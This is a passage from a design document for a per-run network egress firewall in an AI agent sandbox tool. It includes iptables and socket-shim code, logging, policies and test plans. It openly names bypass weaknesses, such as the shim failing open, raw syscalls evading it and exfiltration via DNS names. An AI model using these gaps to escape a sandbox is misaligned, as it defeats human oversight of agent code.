def _ipt(*args: str, check: bool = True) -> subprocess.CompletedProcess:
    """Run an iptables command with a 5-second timeout. Never raises on failure."""
    try:
        return subprocess.run(
            [IPTABLES, *args],
            capture_output=True, text=True, timeout=5, check=check
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.CalledProcessError):
        return subprocess.CompletedProcess(args, returncode=1, stdout="", stderr="")


def apply_docker_firewall(
    run_id: str,
    policy: FirewallPolicy,
    container_id: str,
) -> str | None:
    """
    Create a per-sandbox iptables chain in DOCKER-USER.
    Returns the chain name, or None if iptables is unavailable.
    """
    chain = CHAIN_PREFIX + run_id[:8]

    # Create chain
    result = _ipt("-N", chain, check=False)
    if result.returncode != 0:
        return None  # iptables unavailable, fall back to DNS intercept

    # Jump from DOCKER-USER to sandbox chain for this container
    _ipt("-I", "DOCKER-USER", "1", "-m", "physdev",
         "--physdev-out", container_id[:12], "-j", chain)

    # Add RETURN rules for allowed CIDRs
    for rule in sorted(policy.allow_rules, key=lambda r: r.priority):
        if rule.rule_type == RuleType.CIDR:
            _ipt("-A", chain, "-d", rule.value, "-j", "RETURN")

    # Add DROP rules for denied CIDRs
    for rule in sorted(policy.deny_rules, key=lambda r: r.priority):
        if rule.rule_type == RuleType.CIDR:
            _ipt("-A", chain, "-d", rule.value,
                 "-j", "LOG", "--log-prefix", f"[TAG-FW:{run_id[:8]}] ",
                 "--log-level", "4")
            _ipt("-A", chain, "-d", rule.value, "-j", "DROP")

    # Default policy at end of chain
    if policy.default_action == FirewallAction.DENY:
        _ipt("-A", chain, "-j", "LOG",
             "--log-prefix", f"[TAG-FW:{run_id[:8]}] ", "--log-level", "4")
        _ipt("-A", chain, "-j", "DROP")
    else:
        _ipt("-A", chain, "-j", "RETURN")

    # Register cleanup on exit
    atexit.register(remove_docker_firewall, chain)

    return chain


def remove_docker_firewall(chain: str) -> None:
    """Remove the sandbox iptables chain. Called on exit or signal."""
    _ipt("-D", "DOCKER-USER", "-j", chain, check=False)
    _ipt("-F", chain, check=False)   # flush rules
    _ipt("-X", chain, check=False)   # delete chain
```

### 10.6 DNS-Intercept Enforcement (Restricted Subprocess and macOS Fallback)

For the restricted subprocess backend and macOS where iptables is unavailable, enforcement occurs by overriding `socket.getaddrinfo` and `socket.connect` in the subprocess's Python environment:

```python
# Written to a temp file and injected via PYTHONSTARTUP or exec'd in forked process
FIREWALL_SHIM_TEMPLATE = """
import socket as _socket
import os
import json

_FIREWALL_SOCKET_PATH = {socket_path!r}
_ORIGINAL_GETADDRINFO = _socket.getaddrinfo
_ORIGINAL_CONNECT = _socket.socket.connect

def _tag_check_connection(host, ip, port, proto="tcp"):
    try:
        import socket as _s
        sock = _s.socket(_s.AF_UNIX, _s.SOCK_STREAM)
        sock.connect(_FIREWALL_SOCKET_PATH)
        msg = json.dumps({{"host": host, "ip": ip, "port": port, "proto": proto, "pid": os.getpid()}})
        sock.sendall(msg.encode() + b"\\n")
        resp = sock.recv(16).decode().strip()
        sock.close()
        return resp == "allow"
    except Exception:
        return True  # fail open if shim socket unavailable

def _tag_getaddrinfo(host, port, *args, **kwargs):
    results = _ORIGINAL_GETADDRINFO(host, port, *args, **kwargs)
    if results:
        ip = results[0][4][0]
        if not _tag_check_connection(host, ip, port):
            raise OSError(111, f"Connection blocked by TAG firewall: {{host}}:{{port}}")
    return results

_socket.getaddrinfo = _tag_getaddrinfo
"""
```

The firewall shim communicates with a Unix domain socket served by a background thread in the TAG process. The server thread receives connection-check requests, evaluates them through `FirewallEngine.evaluate_connection()`, and returns `"allow"` or `"deny"`. This design keeps the evaluation logic in the parent process (where SQLite writes are safe) while the hook runs in the sandboxed subprocess.

### 10.7 Violation Logger Thread

```python
import queue
import threading
import json

class ViolationLogger(threading.Thread):
    """
    Background thread that drains a queue of FirewallViolation objects
    and writes them to SQLite and JSONL without blocking the sandbox.
    """

    def __init__(
        self,
        db_path: str,
        jsonl_path: str,
        viol_queue: "queue.Queue[FirewallViolation | None]",
    ) -> None:
        super().__init__(daemon=True, name="tag-fw-violation-logger")
        self._db_path = db_path
        self._jsonl_path = jsonl_path
        self._queue = viol_queue

    def run(self) -> None:
        import sqlite3, uuid
        conn = sqlite3.connect(self._db_path, timeout=5)
        conn.execute("PRAGMA journal_mode=WAL")
        ensure_violations_schema(conn)

        with open(self._jsonl_path, "a") as fh:
            while True:
                item = self._queue.get()
                if item is None:  # poison pill → shutdown
                    break
                vid = "sfv_" + uuid.uuid4().hex[:8]
                conn.execute(
                    """INSERT OR IGNORE INTO sandbox_firewall_violations
                       (id, run_id, proto, destination_host, destination_ip,
                        destination_port, triggered_rule, pid, violated_at)
                       VALUES (?,?,?,?,?,?,?,?,?)""",
                    (vid, item.run_id, item.proto, item.destination_host,
                     item.destination_ip, item.destination_port,
                     item.triggered_rule, item.pid, item.violated_at),
                )
                conn.commit()
                record = {
                    "id": vid,
                    "run_id": item.run_id,
                    "proto": item.proto,
                    "destination_host": item.destination_host,
                    "destination_ip": item.destination_ip,
                    "destination_port": item.destination_port,
                    "triggered_rule": item.triggered_rule,
                    "pid": item.pid,
                    "violated_at": item.violated_at,
                }
                fh.write(json.dumps(record) + "\n")
                fh.flush()
```

### 10.8 Built-in Named Policies

Built-in policies are defined as Python constants and seeded into SQLite on first `ensure_firewall_schema()` call:

```python
BUILTIN_POLICIES: dict[str, dict] = {
    "open": {
        "default_action": "allow",
        "description": "No restrictions — allow all egress (default behaviour).",
        "rules": [],
    },
    "restricted": {
        "default_action": "deny",
        "description": "Deny all egress. No hosts allowed by default.",
        "rules": [],
    },
    "pypi": {
        "default_action": "deny",
        "description": "Allow PyPI, GitHub, and common Linux package CDNs.",
        "rules": [
            ("allow", "host",     "pypi.org"),
            ("allow", "host",     "files.pythonhosted.org"),
            ("allow", "host",     "api.github.com"),
            ("allow", "host",     "github.com"),
            ("allow", "wildcard", "*.github.com"),
            ("allow", "wildcard", "*.githubusercontent.com"),
            ("allow", "host",     "cdn.jsdelivr.net"),
            ("allow", "host",     "registry.npmjs.org"),
            ("allow", "host",     "registry.yarnpkg.com"),
            ("allow", "host",     "dl-cdn.alpinelinux.org"),
            ("allow", "host",     "deb.debian.org"),
            ("allow", "host",     "security.debian.org"),
            ("allow", "host",     "archive.ubuntu.com"),
            ("allow", "host",     "security.ubuntu.com"),
            ("allow", "wildcard", "*.cloudfront.net"),
        ],
    },
    "custom": {
        "default_action": "allow",
        "description": "User-defined policy (empty placeholder — add rules with firewall add).",
        "rules": [],
    },
}
```

### 10.9 Integration with `run_in_sandbox()`

The existing `run_in_sandbox()` function in `sandbox.py` is extended to accept a `firewall_config: Optional[SandboxFirewallConfig]` parameter:

```python
def run_in_sandbox(
    conn: sqlite3.Connection,
    command_str: str,
    *,
    backend: str = "restricted",
    image: str = "python:3.12-slim",
    timeout: int = 60,
    workdir: Path | None = None,
    firewall_config: Optional[SandboxFirewallConfig] = None,  # NEW
) -> dict:
    ...
    viol_queue: queue.Queue[FirewallViolation | None] = queue.Queue()
    if firewall_config is not None:
        db_path = str(Path.home() / ".tag" / "runtime" / "tag.sqlite3")
        jsonl_path = str(Path.home() / ".tag" / "runtime" / "sandbox-firewall.jsonl")
        logger = ViolationLogger(db_path, jsonl_path, viol_queue)
        logger.start()

    try:
        if backend == "docker":
            exit_code, stdout, stderr = _run_docker(
                cmd, image, timeout=timeout, firewall_config=firewall_config,
                run_id=run_id, viol_queue=viol_queue
            )
        else:
            exit_code, stdout, stderr = _run_restricted(
                cmd, timeout=timeout, workdir=workdir,
                firewall_config=firewall_config, run_id=run_id,
                viol_queue=viol_queue
            )
    finally:
        if firewall_config is not None:
            viol_queue.put(None)   # signal logger to stop
            logger.join(timeout=3)
```

### 10.10 Profile YAML Integration

The existing profile YAML `execution` block is extended with a `network` key:

```yaml
# ~/.tag/profiles/coder/profile.yaml
name: coder
model: claude-sonnet-4-6

execution:
  sandbox: true
  backend: docker
  image: python:3.12-slim
  timeout: 120
  network: coder          # references a stored firewall policy named 'coder'
  # OR: network: restricted|open|pypi|custom
```

Profile loading in `controller.py` calls `load_firewall_policy_for_profile(conn, profile_name)` which queries `sandbox_firewall_policies` and `sandbox_firewall_rules` to build a `FirewallPolicy` object.

---

## 11. Security Considerations

1. **Chain cleanup is safety-critical.** Orphaned iptables chains containing DROP rules can permanently block outbound traffic from subsequent Docker containers that happen to share a bridge. The cleanup path is registered with both `atexit.register()` and `signal.signal(SIGTERM/SIGINT)` handlers. The chain name `TAG-SBX-<run_id[:8]>` is unique per run; a `tag sandbox firewall purge` command performs garbage collection of any stale chains.

2. **Localhost CIDR is never blocked.** `FirewallRule.validate()` rejects rules whose CIDR range contains `127.0.0.0/8` or `::1/128`. Blocking localhost inside the sandbox breaks Python's `multiprocessing`, `asyncio` local sockets, and package managers that use localhost proxies.

3. **Violation log does not record payload data.** `FirewallViolation` records destination host, IP, port, and rule — never the content of the blocked request. This prevents the violation log from becoming a secondary exfiltration channel (e.g., a process leaking data via DNS query names).

4. **DNS intercept shim is scoped to subprocess only.** The `PYTHONSTARTUP` injection only affects the sandboxed subprocess's Python interpreter; it does not affect the TAG parent process. The Unix socket used for evaluation is bound to a randomly-named temp path with permissions `0o600`.

5. **iptables requires root or `CAP_NET_ADMIN`.** TAG's Docker backend invokes iptables commands as the user running `tag`. On systems where the user does not have `CAP_NET_ADMIN` (non-root without sudo), iptables enforcement silently falls back to DNS intercept with a printed warning. This fallback is weaker (user-space only, bypassable by a process that re-implements raw socket calls) and is documented as such.

6. **Wildcard rules are limited to single-level prefix matching.** `*.github.com` matches `api.github.com` but not `evil.api.github.com` to prevent overly broad allow rules. Users who need deeper wildcard matching must enumerate each prefix explicitly.

7. **CIDR collision between allow and deny.** When a destination IP matches both an allow CIDR and a deny CIDR, the allow rule wins (consistent with E2B semantics). This is documented in the CLI `--help` text and in `tag sandbox firewall show` output which displays the effective precedence.

8. **The `pypi` built-in policy's CDN CIDRs may change.** PyPI and GitHub use dynamic CDN IPs. The `pypi` policy allows by hostname (resolved at connection time by the DNS intercept shim), not by static CIDR, to avoid false positives from CDN IP rotation. Users who need strict IP-based allow lists should define a `custom` policy with specific CIDRs.

9. **Log file permissions.** `sandbox-firewall.jsonl` is created with mode `0o600` (owner-readable only). The SQLite database already uses `0o600` via TAG's `open_db()`. Violation data (destination IPs) could reveal browsing/API patterns and must not be world-readable.

10. **iptables LOG target requires kernel module.** The `LOG` target (used to capture kernel-level violation events alongside the user-space shim) requires the `ipt_LOG` kernel module. If unavailable, only `DROP` rules are applied; kernel-level logging is omitted. The user-space shim's violation log is unaffected.

---

## 12. Testing Strategy

### 12.1 Unit Tests

File: `tests/test_sandbox_firewall.py`

| Test | Method |
|------|--------|
| `FirewallRule.validate()` accepts valid CIDRs | `pytest.mark.parametrize` over valid CIDR strings |
| `FirewallRule.validate()` rejects malformed CIDRs | Assert `ValueError` for `"10.0.x.y/24"`, `"999.0.0.0/8"`, `""` |
| `FirewallRule.validate()` rejects localhost CIDRs | Assert `ValueError` for `"127.0.0.1/32"`, `"127.0.0.0/8"` |
| `FirewallRule.matches_host()` — exact match | `api.github.com` matches `api.github.com` |
| `FirewallRule.matches_host()` — wildcard match | `api.github.com` matches `*.github.com` |
| `FirewallRule.matches_host()` — wildcard non-match | `evil.api.github.com` does NOT match `*.github.com` |
| `FirewallRule.matches_ip()` — in range | `10.0.0.5` matches `10.0.0.0/8` |
| `FirewallRule.matches_ip()` — outside range | `192.168.1.1` does not match `10.0.0.0/8` |
| `FirewallPolicy.evaluate()` — allow wins over deny-all | Allow rule for host, deny-all CIDR: returns ALLOW |
| `FirewallPolicy.evaluate()` — default deny with no matching rule | Returns DENY |
| `FirewallPolicy.evaluate()` — default allow with no matching deny | Returns ALLOW |
| `FirewallEngine.evaluate_connection()` — deny-all + per-invocation allow | Specific host allowed, others denied |
| `FirewallEngine.evaluate_connection()` — violation queued on deny | `viol_queue.qsize() == 1` after blocked call |
| `BUILTIN_POLICIES` keys — all four present and valid | Smoke test |
| `_host_matches()` — star pattern | `*` matches any host |

### 12.2 Integration Tests

File: `tests/test_sandbox_firewall_integration.py`

These tests require Docker and run only when `DOCKER_AVAILABLE=1` in the environment:

| Test | Method |
|------|--------|
| DNS intercept blocks denied host | Start restricted sandbox with `--deny-host httpbin.org`; run `python -c "import socket; socket.getaddrinfo('httpbin.org', 80)"`; assert exit code 1 and violation logged |
| DNS intercept allows permitted host | Same setup with `--allow-host pypi.org --deny-all`; `getaddrinfo('pypi.org', 443)` succeeds |
| iptables chain created and removed | After Docker sandbox run with `--deny-all`, assert chain `TAG-SBX-<id>` absent from `iptables -L` |
| Violation row written to SQLite | Run sandbox with blocked destination; query `sandbox_firewall_violations` by `run_id`; assert 1 row |
| Violation row written to JSONL | Same run; tail `sandbox-firewall.jsonl`; parse JSON; assert `destination_ip` field present |
| `pypi` policy allows `pip install` | `tag sandbox run --network pypi --code "pip install requests --quiet"` exits 0 |
| `restricted` policy blocks all | `tag sandbox run --network restricted --code "curl https://example.com"` exits non-zero; violation logged |
| `firewall test` dry-run no TCP connection | `tag sandbox firewall test --policy restricted --destination api.github.com` produces BLOCKED; no actual connection made (verify with `strace` or mock) |
| Chain cleanup on SIGINT | Send SIGINT during sandbox run; assert chain absent from iptables after 2 seconds |
| `ViolationLogger` thread shutdown | Put `None` on queue; assert `logger.is_alive() == False` within 1 second |

### 12.3 Performance Tests

File: `tests/perf/test_sandbox_firewall_perf.py`

| Test | Target | Method |
|------|--------|--------|
| Firewall startup overhead (Docker) | < 200 ms | Time 50 `apply_docker_firewall()` calls; assert p95 < 200 ms |
| Firewall startup overhead (DNS shim) | < 10 ms | Time 50 shim injections; assert p95 < 10 ms |
| `evaluate_connection()` throughput | > 100,000 evaluations/sec | `timeit` loop; 10-rule policy |
| Violation logger throughput | > 5,000 violations/sec | Flood queue with 10,000 violations; measure flush time |
| Chain removal latency | < 1 s for 1000-rule chain | Benchmark `remove_docker_firewall()` with 1000-rule chain |

---

## 13. Acceptance Criteria

| ID | Criterion | Verification |
|----|-----------|--------------|
| AC-01 | `tag sandbox run --code "python -c 'import socket; socket.connect((\"8.8.8.8\", 53))'" --deny-all` exits non-zero and prints "BLOCKED" in output. | Integration test |
| AC-02 | `tag sandbox run --code "..." --deny-all --allow-host pypi.org` — a TCP connection to pypi.org:443 succeeds; a TCP connection to google.com:443 is blocked. | Integration test |
| AC-03 | After `tag sandbox firewall add --profile coder --allow "pypi.org" --deny "*"`, running `tag sandbox run --profile coder --code "..."` automatically applies the stored policy. | Integration test |
| AC-04 | `tag sandbox firewall list` outputs all stored policies plus the four built-in policies in a formatted table. | CLI test |
| AC-05 | `tag sandbox firewall test --policy restricted --destination google.com` prints "Result: BLOCKED" and exits 0 (test result, not an error). | CLI test |
| AC-06 | `tag sandbox firewall test --policy pypi --destination pypi.org` prints "Result: ALLOWED". | CLI test |
| AC-07 | Every blocked connection in a Docker sandbox produces a row in `sandbox_firewall_violations` with correct `run_id`, `destination_ip`, `triggered_rule`, and `violated_at`. | SQLite assertion test |
| AC-08 | Every blocked connection produces a valid JSON object appended to `sandbox-firewall.jsonl` within 500 ms. | File assertion test |
| AC-09 | After sandbox exit (normal, SIGINT, or crash), `iptables -L | grep TAG-SBX` returns no lines. | Shell assertion test |
| AC-10 | `tag sandbox run --network open` on a profile with `network: restricted` in YAML overrides the profile policy and allows all egress. | Integration test |
| AC-11 | `tag sandbox firewall add --profile coder --allow "127.0.0.0/8" --deny "*"` exits non-zero with error message "Cannot block or explicitly allow localhost CIDR 127.0.0.0/8". | CLI test |
| AC-12 | `tag sandbox firewall add --profile coder --allow "*.github.com" --deny "*"` accepts the wildcard rule; `tag sandbox firewall show coder` displays it as `wildcard  *.github.com`. | CLI test |
| AC-13 | On macOS (no iptables), `tag sandbox run --deny-all` prints a warning about DNS-intercept fallback and still blocks connections via the Python shim. | Manual macOS test |
| AC-14 | `tag sandbox firewall violations --run-id <id>` returns all violations for that run in table format; `--json` returns a valid JSON array. | CLI test |
| AC-15 | Installing TAG without any optional extras still allows `tag sandbox firewall` commands to parse and validate (no import errors from iptables or Docker SDK). | `python -c "from tag.sandbox import FirewallPolicy"` exits 0 |

---

## 14. Dependencies

| Dependency | Type | Notes |
|------------|------|-------|
| PRD-028 (Sandbox Code Execution) | Blocking | This PRD extends `sandbox.py` and the `sandbox_runs` table from PRD-028. PRD-028 must be merged first. |
| `iptables` CLI | Optional runtime | Required for Docker backend host-level enforcement on Linux. Graceful fallback to DNS intercept when absent. |
| `ipaddress` (stdlib) | Required | Python standard library; available in Python 3.4+. Used for CIDR parsing and matching. |
| `threading`, `queue` (stdlib) | Required | Used for ViolationLogger background thread. |
| `socket` (stdlib) | Required | Monkey-patched for DNS intercept in restricted subprocess backend. |
| PRD-013 (Agent Tracing) | Optional | Violation events emitted as OTel spans if tracing is configured. Feature works without PRD-013. |
| PRD-034 (Secret Scanning) | Reference | `security.py` path-validation patterns referenced for credential-path exclusions in mount validation; no code dependency. |
| PRD-005 (Execution Backend Selection) | Reference | Profile YAML `execution` block structure; `network` key extends existing schema. |
| Docker Engine | Optional runtime | Required for Docker backend. Restricted subprocess backend works without Docker. |

---

## 15. Open Questions

| # | Question | Owner | Resolution Target |
|---|----------|-------|-------------------|
| OQ-1 | Should `ip6tables` be managed in parallel with `iptables` for IPv6 enforcement? The threat model (agent code phoning home) applies equally to IPv6 destinations, but dual-stack management doubles the cleanup surface area. | Platform team | Before v1 merge |
| OQ-2 | Should the `pypi` built-in policy list be maintained as a static constant or fetched from a remote source (e.g., a TAG-managed JSON file) to keep pace with CDN IP changes? A remote fetch introduces a network dependency at startup. | Security team | v1.1 |
| OQ-3 | Should violations be emitted to the existing `tracing.py` span store as child spans of the current agent run, or only to the dedicated `sandbox_firewall_violations` table? Using the span store would allow `tag trace show` to surface violations inline. | Observability team | Before v1 merge |
| OQ-4 | The DNS-intercept shim only intercepts Python-level socket calls. A process that uses C extensions with direct `syscall(SYS_connect, ...)` bypasses the shim. Should we document this limitation explicitly, or invest in seccomp-based enforcement for the restricted backend? | Security team | v1 docs |
| OQ-5 | Should `tag sandbox firewall add` support importing rules from a YAML file (e.g., `--from-file network-policy.yaml`) for teams managing policies in version control? This aligns with the profile YAML pattern. | CLI team | v1.1 |
| OQ-6 | Should the built-in `custom` policy be removed in favour of requiring users to always create a named policy? The `custom` placeholder may cause confusion when multiple users on the same machine both try to use `--network custom`. | UX team | Before v1 merge |
| OQ-7 | What is the right behaviour when iptables rules cannot be applied (permissions error) and the DNS intercept shim also fails to inject (e.g., non-Python subprocess)? Fail-open (allow all) or fail-closed (abort sandbox run)? | Security team | Before v1 merge |
| OQ-8 | Should violation data be included in `tag sandbox run --json` output, or only available via `tag sandbox firewall violations --run-id`? Including it in `run` output makes scripting easier but increases the output payload size. | CLI team | v1 |

---

## 16. Complexity and Timeline

**Overall estimate:** M (7-10 engineering days)

### Phase 1 — Core Firewall Engine (Days 1-3)

- Implement `FirewallRule`, `FirewallPolicy`, `SandboxFirewallConfig`, `FirewallEngine` dataclasses in `sandbox.py`
- Implement `BUILTIN_POLICIES` constants
- Implement `FirewallPolicy.evaluate()` with full precedence logic
- Add SQLite DDL (`sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`) to `ensure_schema()`
- Seed built-in policies on `ensure_schema()` with `INSERT OR IGNORE`
- Unit tests for all rule matching logic and policy evaluation
- **Deliverable:** `FirewallEngine.evaluate_connection()` is tested and correct; no CLI yet

### Phase 2 — Enforcement Backends (Days 4-6)

- Implement `apply_docker_firewall()` and `remove_docker_firewall()` using iptables subprocess calls
- Implement `ViolationLogger` background thread with SQLite + JSONL writes
- Implement DNS-intercept shim template and Unix socket server for restricted subprocess backend
- Extend `_run_docker()` and `_run_restricted()` in `sandbox.py` to accept `firewall_config` and wire up enforcement
- Extend `run_in_sandbox()` to accept `firewall_config`, start/stop `ViolationLogger`, apply enforcement
- Register atexit and signal handlers for chain cleanup
- Integration tests (Docker-gated): DNS intercept, iptables chain lifecycle, violation logging
- **Deliverable:** `run_in_sandbox(firewall_config=...)` enforces rules end-to-end

### Phase 3 — CLI Surface (Days 7-9)

- Add `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, `--network` flags to `cmd_sandbox_run` in `controller.py`
- Implement `cmd_sandbox_firewall_add`, `cmd_sandbox_firewall_list`, `cmd_sandbox_firewall_show`, `cmd_sandbox_firewall_remove`, `cmd_sandbox_firewall_test`, `cmd_sandbox_firewall_violations` in `controller.py`
- Profile YAML `network` key loading in `load_firewall_policy_for_profile()`
- Wire `--network` flag through to `run_in_sandbox()` via `SandboxFirewallConfig`
- CLI tests for all 7 subcommands
- **Deliverable:** Full `tag sandbox firewall` CLI surface functional

### Phase 4 — Polish and Performance (Day 10)

- OTel span emission for violations (PRD-013 integration, if PRD-013 is merged)
- Performance benchmarks; optimize `evaluate_connection()` for hot path
- macOS fallback testing and warning messages
- Documentation: `--help` text, `docs/sandbox-firewall.md` (one-page reference)
- Final acceptance criteria sweep
- **Deliverable:** All 15 AC items passing; performance targets met; ready for merge

---

*End of PRD-094*

